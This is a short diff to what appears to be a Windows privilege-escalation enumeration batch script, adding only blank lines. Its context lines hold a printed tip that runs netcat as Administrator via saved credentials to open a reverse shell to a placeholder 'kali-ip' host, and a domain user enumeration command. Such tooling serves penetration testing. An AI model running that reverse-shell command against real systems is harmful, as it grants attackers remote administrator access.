@@ -66,6 +66,7 @@ echo.
 
 echo %BOLD%%BLUE%****if cmdkey is listed, you can run commands based on the user permission. see below example.%RESET%
 echo %BOLD%%BLUE%****runas /savecred /user:Administrator "nc.exe -nv kali-ip 4445 -e cmd.exe" or Powershell from nishang.%RESET%
+echo.
 
 echo %YELLOW%[Command]%RESET% %GREEN%net user /domain%RESET%
 net user /domain 2>nul | findstr /v "The request will be processed at a domain controller"
@@ -223,4 +224,5 @@ echo.
 echo %BOLD%%GREEN%[*] Enumeration Complete%RESET%
 <nul set /p "=%ESC%[?25h"
 endlocal
+
 
